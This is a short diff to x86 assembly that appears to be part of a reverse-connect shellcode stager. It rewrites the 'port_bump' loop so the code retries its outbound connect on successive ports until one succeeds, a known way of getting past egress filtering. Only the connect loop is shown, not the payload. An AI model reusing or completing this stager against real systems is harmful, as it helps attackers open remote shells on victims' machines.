@@ -40,7 +40,6 @@ set_address:
   push 0x5C110002        ; family AF_INET and port 1
   mov esi, esp           ; save pointer to sockaddr struct
 
-  xor ebx, ebx
 try_connect:
   push byte 16           ; length of the sockaddr struct
   push esi               ; pointer to the sockaddr struct
@@ -52,10 +51,12 @@ try_connect:
   jz short connected
 
 port_bump:
-  xchg bh,bl
-  inc bx
-  xchg bh,bl
-  mov word [esi+2], bx
+  xor eax, eax
+  mov word ax, [esi+2]
+  xchg ah,al
+  inc ax
+  xchg ah,al
+  mov word [esi+2], ax
   jmp short try_connect
 
 connected:  
